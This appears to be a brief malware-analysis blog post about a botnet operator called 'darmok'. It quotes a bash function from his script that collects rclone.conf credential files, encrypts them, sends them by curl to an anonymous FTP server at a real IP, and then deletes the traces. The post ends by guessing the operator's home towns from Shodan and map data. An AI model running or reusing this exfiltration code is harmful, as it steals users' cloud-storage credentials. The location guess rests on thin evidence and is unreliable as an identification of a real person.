## Darmok's Downfall

During routine testing. Found a device that was compromised  Monday, December 23, 2019 1:49:54 PM GMT-06:00.

After echoing out the base64 and decoding the string I was able to disern this was darmok from his use of a `d1()` function name.

After pulling down J6M86V.sh there wasn't a whole lot that was different.

Darmok has been at 'war' with another botnet actor for a while and has had to change up and move c2's around a bit.

However another machine was compromised Sunday, December 8, 2019 8:55:09 PM GMT-06:00. This had a file that I had not noticed before called `test.txt`.

After pulling down the file...it failed...

It was odd as most of his script is taking great lengths to ensure that his code is properly downloaded.

upon using a browser to go to that link I was greeted with a download page from http://www.mediafire.com/file/zk19hsd265x3kgx/test1.txt/file

Works for me.

upon inspecting the file it was a very similiar to identical script that was used before.

However, On inspection there was a call to a ftp server using anonymous login.

```
grabfilego(){
rcl=$(find ~/ /root /home -maxdepth 3 -name 'rclone.conf' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
curl -o /tmp/pub.asc https://s.put.re/km9V1CWT.asc
gpg --import /tmp/pub.asc
for file in $rcl
do
gpg --trust-model always --recipient me@me.com --encrypt $file
curl -T $file.gpg ftp://anonymous:anonymous@136.55.35.132/Passport/Music/Various/$(head /dev/urandom | tr -dc a-z0-9 | head -c 5).gpg
rm -rf *.gpg
find ~/ /root /home -maxdepth 3 -name 'rclone.conf.gpg' -exec rm {} \;
done
```

A quick shodan search pulls in the information.
https://www.shodan.io/host/136.55.35.132

Screenshot is also attached.

The two towns that were mentioned interested me.

A quick google search in googlemaps can be found here:
https://www.google.com/maps/dir/Overland+Park,+KS/Pretty+Prairie,+KS+67570/@37.8013383,-98.0546907,10.5z/data=!4m14!4m13!1m5!1m1!1s0x87c09551a72638d3:0x24ce4feb3844f9c8!2m2!1d-94.6707917!2d38.9822282!1m5!1m1!1s0x87a4d0ac8dfb4407:0xb75fd6945327576!2m2!1d-98.0197792!2d37.7800135!3e0

NOTE: the same body of water is pictured here from the shodan link.

The two neighboring towns where 'darmok' is then would be at a glance within Pretty Prairie, Kansas or Andale, Kansas
